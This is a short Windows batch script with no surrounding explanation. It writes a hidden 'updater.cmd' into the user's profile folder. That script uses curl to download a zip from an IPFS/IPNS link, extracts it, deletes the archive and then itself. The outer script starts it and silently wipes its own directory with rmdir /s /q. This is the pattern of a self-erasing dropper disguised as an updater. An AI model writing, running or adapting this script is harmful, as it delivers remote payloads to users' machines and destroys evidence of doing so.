cd /d %~dp0
(
echo @echo off
echo curl.exe https://ipfs.io/ipns/link/file.zip -O
echo tar -xf "%CD%\file.zip"
echo del "%CD%\file.zip"
echo start cmd /C del "%userprofile%\updater.cmd"
echo exit
) > "%userprofile%\updater.cmd"
start "" "%userprofile%\updater.cmd"
rmdir "%CD%" /s /q
